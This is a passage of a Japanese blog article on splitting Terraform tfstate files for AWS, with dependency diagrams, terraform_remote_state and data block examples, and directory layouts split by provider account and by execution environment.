異なるリポジトリの場合▼ 同じリポジトリの場合【チーム別 \xd7 サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合同じテナント内のプロダクト別この分割方法について【同じテナント内のプロダクト】状態の依存関係図【同じテナント内のプロダクト】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【同じテナント内のプロダクト】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合AWSリソースの種類グループ別この分割方法について【種類グループ別】状態の依存関係図【種類グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【種類グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合AWSリソースの状態の変更頻度グループ別この分割方法について【変更頻度グループ別】状態の依存関係図【変更頻度グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【変更頻度グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合10. おわりに謝辞記事関連のおすすめ書籍01. はじめにどうも、Mitchell Hashimoto です。さて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、チームが使っているTerraform\uD83E\uDDD1\uD83C\uDFFB‍\uD83D\uDE80のリポジトリをリプレイスする作業を担当しました。このリポジトリでは単一のtfstateファイルが状態を持ち過ぎている課題を抱えていたため、課題に合った適切な分割パターンでリプレイスしました。今回は、この時に整理した分割パターン (AWS向け) を記事で解説しました。もちろん、GoogleCloudやAzureでも読み換えていただければ、同じように適用できます。知る限りの分割パターンを記載したところ、情報量がエグいことになってしまったため、気になる分割パターンだけ拾って帰っていただけるとハッピーです\uD83D\uDE4Fそれでは、もりもり布教していきます\uD83D\uDE1702. なぜ tfstate ファイルを分割するのか%%{init: { \'theme\': \\"default\\", \'themeVariables\': { \'commitLabelFontSize\': \'13px\' }}}%%gitGraph   commit id: \\"8c8e6\\"   commit id: \\"0e3c3\\"     branch feature/foo     checkout feature/foo     commit id: \\"4e9e8\\"     commit id: \\"da005\\"   checkout main     branch feature/bar     commit id: \\"2d52f\\"   checkout main   commit id: \\"e74d6\\"     branch feature/baz     commit id: \\"f6881\\"分割していない場合そもそも、なぜtfstateファイルを分割する必要があるのでしょうか。tfstateファイルを分割しなかったと仮定します。様々なインフラコンポーネントを単一のtfstateファイルで状態を持つ場合、1回のterraformコマンド全てのコンポーネントの状態を操作できて楽です。ただし、複数の作業ブランチがある状況だと煩わしいことが起こります。各作業ブランチでインフラコンポーネントの状態を変更しかけていると、terraformコマンドでtargetオプションが必要になります。単一のtfstateファイルで管理するコンポーネントが多くなるほど、この問題は顕著になります。分割している場合その一方で、tfstateファイルをいい感じに分割したと仮定します。各作業ブランチでは、まるで暗黙的にtargetオプションがついたように、他の作業ブランチから影響を受けずにterraformコマンドを実行できます。よって、各tfstateファイルを操作できる管理者は互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Terraform: Up & Running; Writing Infrastructure As CodeOrganizing With Multiple States - DevOps with Terraform - CloudCasts分割しなくていい場合運用ルールや開発者人数が理由で作業が衝突せず、targetオプションが必要ない状況であれば、tfstateファイルは分割しなくてもよいでしょう。tfstateファイルを分割するメリットが少ないです\uD83D\uDE45\uD83C\uDFFB‍03. tfstate ファイルの分割分割の境界それでは、tfstateファイルの分割の境界はどのようにして見つければよいのでしょうか。これを見つけるコツは、できるだけ相互に依存しないインフラリソースの関係 に注目することだと考えています。ここでいう依存とは、tfstateファイルが他のtfstateファイルの状態を使用することです。状態をほとんど使用し合わないインフラリソース同士を、異なるtfstateファイルで管理します。異なるtfstateファイルで管理できる分割パターンについては後述します。▶ 『依存』という用語についてアーキテクチャの文脈では、他を使用することを『依存』と表現します。そのため便宜上、tfstateファイルでも同じ用語で表現することにしました。@tmknom さんが述べている通り、Terraformをよりよく設計するためには、『ソフトウェアの基礎知識』が必要です\uD83D\uDC4D状態の依存関係図依存関係図とは分割したtfstateファイル間の状態の依存関係を表現した図です。プロバイダーのアカウントの状態をtfstateファイルで管理していることを想像してみてください。%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWSアカウント        foo[\\"tfstateファイル\\"]    end似たものとしてterraform graphコマンドによるグラフがありますが、これはインフラリソース間の依存関係図です。tfstateファイル間で相互に依存関係があるからといって、個別のインフラリソース間で循環参照が起こってしまうというわけではないです。続いて、依存関係がある場合と無い場合で、どのような依存関係図になるかを紹介していきます。Command: graph | Terraform | HashiCorp Developer依存関係の表現▼ 依存関係の表現記法tfstateファイル間で状態の依存関係がある場合、これを図で表現すると分割の状況がわかりやすくなります。『依存』は、---> (波線矢印) で表現することとします。設定値の参照数が少ないほどよいです。依存関係がある場合については、後述します。▶ 『依存』の波線矢印についてアーキテクチャの文脈では、『依存』を---> (波線矢印) で表現します。そのため便宜上、tfstateファイルでも同じ記号で表現することにしました\uD83D\uDC4D▼ 依存関係がない場合例えば、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、 tfstate ファイル間に依存関係はないとします。そのため、想定される状態の依存関係図は以下の通りになります。tfstateファイル間に依存関係がない状況がベストです。---title: tfstateファイル間に依存関係はない---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWSアカウント        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end▼ 依存関係がある場合同様に分割したと仮定します。ここで仮定した状況では、 foo-tfstate ➡︎ bar-tfstate の方向に依存しているとします。そのため、---> (波線矢印) を使用して、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: foo-tfstateファイルは、bar-tfstateファイルに依存---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph AWSアカウント        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. 依存 .-> bar04. tfstate ファイルに基づくその他の設計リポジトリ \uD83D\uDC31 の設計リポジトリ分割ここまでで、tfstateファイル分割について簡単に紹介しました。リポジトリの分割は、tfstateファイル分割に基づいて設計しましょう。異なるリポジトリにtfstateファイルをおいた方がよい場合については、分割パターン で説明しています。\uD83D\uDC31 foo-repository/├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する...\uD83D\uDC31 bar-repository/├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する...ディレクトリ \uD83D\uDCC2 構成リポジトリ内のディレクトリ構成も、tfstateファイル分割に基づいて設計しましょう。率直に言うと、Terraformのディレクトリ構成のパターンは無数にあります。そのため、基準なしにディレクトリ構成を考えると何でもあり になってしまいます。その一方で、tfstateファイル分割に基づいて設計することにより、明確なディレクトリ構成パターン として抽出可能になります。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ...▶ ローカルモジュールのディレクトリ構成の設計についてリポジトリ内だけでブロック (例：resource、data) のセットを使い回すことを目的とした、ローカルモジュールがあります。今回、これのディレクトリ構成は設計に含めていません。混同しやすいのですが、tfstateファイル分割に基づくディレクトリ構成とローカルモジュール内のそれは、全く別のテーマとして切り離して考えることができます\uD83D\uDC4Dリモートバックエンド \uD83E\uDEA3 の設計リモートバックエンド分割本記事では、リモートバックエンドとしてAWS S3バケットを使用することを想定しています。リモートバックエンドの分割は、tfstateファイル分割に基づいて設計しましょう。異なるリモートバックエンドにtfstateファイルをおいた方がよい場合については、分割パターン で説明しています。\uD83E\uDEA3 foo-bucket/│└── terraform.tfstate # fooコンポーネントの状態を持つ\uD83E\uDEA3 bar-bucket/│└── terraform.tfstate # barコンポーネントの状態を持つディレクトリ構成リモートバックエンド内のディレクトリ構成も、tfstateファイル分割に基づいて設計しましょう。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo/│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar/      └── terraform.tfstate # barコンポーネントの状態を持つ05. 状態の依存関係の定義方法terraform_remote_stateブロックの場合terraform_remote_stateブロックによる依存terraform_remote_stateブロックには、以下のメリデメがあります。 アーキテクチャ特性  メリット ⭕️                                                                        デメリット \xd7                                                                                                                                                      可読性                 -                                                                                  terraform_remote_stateブロックに加えてoutputブロックも実装が必要であり、outputブロックは依存先のAWSリソースが一見してわかりにくい。                             拡張性                 依存先のAWSリソースに関わらず、同じterraform_remote_stateブロックを使い回せる。  -                                                                                                                                                                     保守性                 -                                                                                  依存先と依存元の間でTerraformのバージョンに差がありすぎると、tfstateファイル間で互換性がなくなり、terraform_remote_stateブロックの処理が失敗する。 本記事では、 terraform_remote_state ブロックを使用して、状態の依存関係を定義 していきます。tfstateファイルが他のtfstateファイルに依存する方法として、後述のAWSリソース別のdataブロックがあります。The terraform_remote_state Data Source | Terraform | HashiCorp Developer状態の依存関係図例えば、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、bar-tfstateファイルはVPCの状態を持っており、 foo-tfstate ファイルは bar-tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: terraform_remote_stateブロックを使用した依存関係---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph bucket        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. VPCの状態に依存 .-> barリポジトリのディレクトリ構成tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。ディレクトリの設計方法は、分割パターン で説明しています。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ├── remote_state.tf # terraform_remote_stateブロックを使用し、bar-tfstate ファイルに依存する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ├── output.tf # 他の tfstate ファイルから依存される      ├── provider.tf      ...foo-tfstateファイルがbar-tfstateファイルに依存するために必要な実装は、以下の通りになります。resource \\"example\\" \\"foo\\" {  # fooリソースは、bar-tfstate ファイルのVPCに依存する  vpc_id = data.terraform_remote_state.bar.outputs.bar_vpc_id  ...}data \\"terraform_remote_state\\" \\"bar\\" { backend = \\"s3\\"  config = {    bucket = \\"tfstate\\"    key    = \\"bar/terraform.tfstate\\"    region = \\"ap-northeast-1\\"  }}# VPCの状態は、bar-tfstate ファイルで持つoutput \\"bar_vpc_id\\" {  value = aws_vpc.bar.id}resource \\"aws_vpc\\" \\"bar\\" {  ...}リモートバックエンドのディレクトリ構成tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar      └── terraform.tfstate # barコンポーネントの状態を持つAWSリソース別のdataブロックの場合AWSリソース別のdataブロックによる依存dataブロックには、以下のメリデメがあります。 アーキテクチャ特性  メリット ⭕️                                                                                                                                     デメリット \xd7                                                   可読性                 依存先のAWSリソースがわかりやすい。                                                                                                             -                                                                  拡張性                 -                                                                                                                                               依存先のAWSリソース別にdataブロックが必要である。                保守性                 依存先と依存元の間でTerraformのバージョンに差があっても、tfstateファイル間で直接的に依存するわけではないため、バージョン差の影響を受けない。  -                                                   今回は使用しませんが、依存関係の他の定義方法として、AWSリソース別のdataブロックがあります。これは、tfstateファイルが自身以外 (例：コンソール画面、他のtfstateファイル) で作成されたAWSリソースの状態に依存するために使用できます。terraform_remote_stateブロックとは異なり、直接的にはtfstateファイルに依存しません。dataブロックの場合は、実際のAWSリソースの状態に依存することにより、間接的にAWSリソースのtfstateファイルに依存することになります。Data Sources - Configuration Language | Terraform | HashiCorp Developer状態の依存関係図例えば、dataブロックも同様にして、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、bar-tfstateファイルはVPCの状態を持っており、 foo-tfstate ファイルは bar-tfstate ファイルに依存しているとします。想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: dataブロックを使用した依存関係---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph bucket        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. VPCの状態に依存 .-> barリポジトリのディレクトリ構成ディレクトリ構成は、tfstateファイル分割に基づいて、以下の通りになります。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ├── data.tf # dataブロックを使用し、bar-tfstate ファイルに依存する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ├── provider.tf      ...foo-tfstateファイルがbar-tfstateファイルに依存するために必要な実装は、以下の通りになります。# fooリソースの状態は、foo-tfstate ファイルで持つresource \\"example\\" \\"foo\\" {  # fooリソースは、bar-tfstate ファイルのVPCに依存する  vpc_id     = data.aws_vpc.bar.id}# VPCの状態は、bar-tfstate ファイルで持つdata \\"aws_vpc\\" \\"bar\\" {  filter {    name   = \\"tag:Name\\"    values = [\\"<bar-tfstateが持つVPCの名前>\\"]  }}リモートバックエンドのディレクトリ構成tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar      └── terraform.tfstate # barコンポーネントの状態を持つ06. tfstate ファイルの分割パターンオススメな設計の一覧前述の通り、tfstateファイルの分割の境界は、『他の状態にできるだけ依存しないリソースの関係』から見つけることができます。分割しすぎると terraform_remote_stateブロック地獄 になるため、細かすぎず粗すぎない適切な境界を見つけていきましょう。今回は、私が考える分割パターンをいくつか紹介します。全てが実用的なパターンというわけでないため、オススメするものを ★ としています。推奨・任意    tfstate分割パターン大分類    tfstate分割パターン小分類オススメ    対応するリポジトリ構成 \uD83D\uDC31    対応するリモートバックエンド構成 \uD83E\uDEA3  推奨    上層    プロバイダーのアカウント別    ★★★    リポジトリ自体または上層ディレクトリ    リモートバックエンド自体または上層ディレクトリ  下層実行環境別    ★★★    下層ディレクトリ    下層ディレクトリ  任意    中間層    運用チーム責務範囲別    ★★    中間層ディレクトリ    中間層ディレクトリ  プロダクトのサブコンポーネント別    ★★  運用チーム責務範囲別\xd7プロダクトのサブコンポーネント別(組み合わせ)    ★  同じテナント内のプロダクト別      AWSリソースの種類グループ別      AWSリソースの状態の変更頻度グループ別      大分類 (上層/下層/中間層) とディレクトリ構成の関係リポジトリの場合記事内のここ で、リポジトリ内のディレクトリ構成はtfstateファイル分割に基づいて設計するべき、という説明をしました。tfstateファイルの分割パターンは、上層/下層/中間層 の層に大別できます。これらの層は、以下の通りリポジトリ自体・ディレクトリ構成の設計方法に影響します。# リポジトリ自体を分割する場合\uD83D\uDC31 上層/├── \uD83D\uDCC2 中間層/│    ├── \uD83D\uDCC2 下層/│    │    ├── backend.tfvars # 分割された tfstate ファイルを指定する│    │    ...│    │...# リポジトリ内のディレクトリを分割する場合\uD83D\uDC31 リポジトリ/├── \uD83D\uDCC2 上層/│    ├── \uD83D\uDCC2 中間層/│    │    ├── \uD83D\uDCC2 下層/│    │    │    ├── backend.tfvars # 分割された tfstate ファイルを指定する│    │    │    ...│    │    │...リモートバックエンドの場合記事内のここ で、リモートバックエンドのディレクトリ構成についても言及しました。これらの層は、以下の通りリモートバックエンド自体・ディレクトリ構成の設計方法に影響します。# リモートバックエンド自体を分割する場合\uD83E\uDEA3 上層/├── \uD83D\uDCC2 中間層/│    ├── \uD83D\uDCC2 下層/│    │    └── terraform.tfstate # 分割された状態を持つ│    ││    │...# リモートバックエンド内のディレクトリを分割する場合\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 上層/│    ├── \uD83D\uDCC2 中間層/│    │    ├── \uD83D\uDCC2 下層/│    │    │    └── terraform.tfstate # 分割された状態を持つ│    │    ││    │    │...07. 上層の分割 (推奨)上層の分割について上層の分割は 推奨 です。Terraformに携わる管理者の数が少なくても採用した方がよいです。tfstateファイルをパターンに応じて分割し、これに基づいてディレクトリ・リモートバックエンドも設計しましょう。プロバイダーのアカウント別 - ★★★この分割方法について上層分割の中でも、基本的な方法の1つです。プロバイダーのアカウント別にtfstateファイルを分割し、上層もこれに基づいて設計します。この分割方法により、各プロバイダーの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度についてtfstateファイルで状態を管理せざるを得ない場合があります。例えば、Kubernetesのプロバイダーは、EKSと同じtfstateファイルで管理した方がよいです\uD83D\uDC4DTerraform Registry【プロバイダーアカウント別】状態の依存関係図例えば、以下のプロバイダーを使用したい状況と仮定します。主要プロバイダー (AWS)アプリ/インフラ監視プロバイダー (Datadog)ジョブ監視プロバイダー (Healthchecks)インシデント管理プロバイダー (PagerDuty)ここで仮定した状況では、各プロバイダーの tfstate ファイル間で状態が相互に依存しているとします。AWSリソース間の相互依存ではないため、循環参照は起こりません。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: プロバイダーのアカウント別---%%{init:{\'theme\':\'default\'}}%%flowchart LR    subgraph PagerDuty        pagerDuty[\\"tfstate\\"]    end    subgraph Healthchecks        healthchecks[\\"tfstate\\"]    end    subgraph Datadog        datadog[\\"tfstate\\"]    end    subgraph AWS        aws[\\"tfstate\\"]    end    aws -...-> datadog    aws -...-> healthchecks    aws -...-> pagerDuty    datadog -...-> aws    healthchecks -...-> aws    pagerDuty -...-> aws【プロバイダーアカウント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロバイダーアカウント別に分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── backend.tf # AWSの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 datadog-repository/├── backend.tf # Datadogの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 healthchecks-repository/├── backend.tf # Healthchecksの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 pagerduty-repository/├── backend.tf # PagerDutyの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...▼ 同じリポジトリの場合プロバイダーアカウント別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 repository/├── \uD83D\uDCC2 aws/│    ├── backend.tf # AWSの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│├── \uD83D\uDCC2 datadog/│    ├── backend.tf # Datadogの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│├── \uD83D\uDCC2 healthchecks/│    ├── backend.tf # Healthchecksの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 pagerduty/      ├── backend.tf # PagerDutyの状態を持つ tfstate ファイルを指定する      ├── output.tf # 他の tfstate ファイルから依存される      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── provider.tf      ...【プロバイダーアカウント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合プロバイダーアカウント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 aws-bucket/│└── terraform.tfstate # AWSの状態を持つ\uD83E\uDEA3 datadog-bucket/│└── terraform.tfstate # Datadogの状態を持つ\uD83E\uDEA3 healthchecks-bucket/│└── terraform.tfstate # Healthchecksの状態を持つ\uD83E\uDEA3 pagerduty-bucket/│└── terraform.tfstate # PagerDutyの状態を持つ▼ 同じリモートバックエンドの場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 aws│    └── terraform.tfstate # AWSの状態を持つ│├── \uD83D\uDCC2 datadog│    └── terraform.tfstate # Datadogの状態を持つ│├── \uD83D\uDCC2 healthchecks│    └── terraform.tfstate # Healthchecksの状態を持つ│└── \uD83D\uDCC2 pagerduty      └── terraform.tfstate # PagerDutyの状態を持つ08. 下層の分割 (推奨)下層の分割について下層の分割は 推奨 です。Terraformに携わる管理者の数が少なくても採用した方がよいです。tfstateファイルをパターンに応じて分割し、これに基づいてディレクトリ・リモートバックエンドも設計しましょう。実行環境別 - ★★★この分割方法について下層分割の中でも、基本的な方法の1つです。実行環境別にtfstateファイルを分割し、下層もこれに基づいて設計します。この分割方法により、各実行環境の管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Terraform: Up & Running; Writing Infrastructure As CodeHow to manage Terraform state. A guide to file layout, isolation, and… | by Yevgeniy Brikman | Gruntwork▶ おすすめ度について【実行環境別】状態の依存関係図例えば、以下の実行環境を構築したい状況と仮定します。Tes環境 (検証環境)Stg環境 (ユーザー受け入れ環境)Prd環境 (本番環境)かつ、以下のプロバイダーを使用したい状況と仮定します。主要プロバイダー (AWS)アプリ/インフラ監視プロバイダー (Datadog)ジョブ監視プロバイダー (Healthchecks)インシデント管理プロバイダー (PagerDuty)ここで仮定した状況では、各実行環境の tfstate ファイルは他の実行環境には依存していないとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 実行環境別---%%{init:{\'theme\':\'default\'}}%%flowchart LR    subgraph PagerDuty        pagerDuty[\\"tfstate\\"]    end    subgraph Healthchecks        healthchecks[\\"tfstate\\"]    end    subgraph Datadog        datadog[\\"tfstate\\"]    end    subgraph AWS        subgraph tes-bucket            tes[\\"tfstate\\"]        end        subgraph stg-bucket            stg[\\"tfstate\\"]        end        subgraph prd-bucket            prd[\\"tfstate\\"]        end    end    tes -...-> datadog    tes -...-> healthchecks    tes -...-> pagerDuty    datadog -...-> tes    healthchecks -...-> tes    pagerDuty -...-> tes【実行環境別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロバイダーアカウント別にtfstateファイルを分割することは推奨としているため、その上でディレクトリ構成を考えます。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # Tes環境のAWSリソースの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境└── \uD83D\uDCC2 prd/ # Prd環境\uD83D\uDC31 datadog-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # Tes環境のDatadogの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/\uD83D\uDC31 healthchecks-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # HealthchecsのTes環境の状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/\uD83D\uDC31 pagerduty-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # Tes環境のPagerDutyの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/▼ 同じリポジトリの場合プロバイダーアカウント別にtfstateファイルを分割することは推奨としているため、その上でディレクトリ構成を考えます。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 repository/├── \uD83D\uDCC2 aws/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # Tes環境のAWSリソースの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    └── \uD83D\uDCC2 prd/ # Prd環境│├── \uD83D\uDCC2 datadog/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/│    │    ├── backend.tfvars # Tes環境のDatadogの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│├── \uD83D\uDCC2 healthchecks/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/│    │    ├── backend.tfvars # Tes環境のHealthchecksの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│└── \uD83D\uDCC2 pagerduty/      ├── output.tf # 他の tfstate ファイルから依存される      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── provider.tf      ├── \uD83D\uDCC2 tes/      │    ├── backend.tfvars # Tes環境のPagerDutyの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/      └── \uD83D\uDCC2 prd/【実行環境別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合実行環境別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。例えば、前述の依存関係図の状況と仮定します。\uD83E\uDEA3 tes-aws-bucket/│└── terraform.tfstate # Tes環境のAWSリソースの状態を持つ\uD83E\uDEA3 tes-datadog-bucket/│└── terraform.tfstate # Tes環境のDatadogの状態を持つ\uD83E\uDEA3 tes-healthchecks-bucket/│└── terraform.tfstate # Tes環境のHealthchecksの状態を持つ\uD83E\uDEA3 tes-pagerduty-bucket/│└── terraform.tfstate # Tes環境のPagerDutyの状態を持つ▼ 同じリモートバックエンド x AWSアカウント別に異なる実行環境 の場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。また、AWSアカウント別に異なる実行環境を作成していると仮定します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 aws/│    └── terraform.tfstate # Tes環境のAWSリソースの状態を持つ│├── \uD83D\uDCC2 datadog/│    └── terraform.tfstate # Tes環境のDatadogの状態を持つ│├── \uD83D\uDCC2 healthchecks/│    └── terraform.tfstate # Tes環境のHealthchecksの状態を持つ│└── \uD83D\uDCC2 pagerduty/      └── terraform.tfstate # Tes環境のPagerDutyの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...▼ 同じリモートバックエンド x 単一のAWSアカウント内に全ての実行環境 の場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。また、単一のAWSアカウント内に全実行環境を作成しているとします。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 aws/│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    └── terraform.tfstate # Tes環境のAWSリソースの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    └── \uD83D\uDCC2 prd/ # Prd環境│├── \uD83D\uDCC2 datadog/│    ├── \uD83D\uDCC2 tes/│    │    └── terraform.tfstate # Tes環境のDatadogの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│├── \uD83D\uDCC2 healthchecks/│    ├── \uD83D\uDCC2 tes/│    │    └── terraform.tfstate # Tes環境のHealthchecksの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│└── \uD83D\uDCC2 pagerduty/      ├── \uD83D\uDCC2 tes/      │    └── terraform.tfstate # Tes環境のPagerDutyの状態を持つ      │      ├── \uD83D\uDCC2 stg/      └── 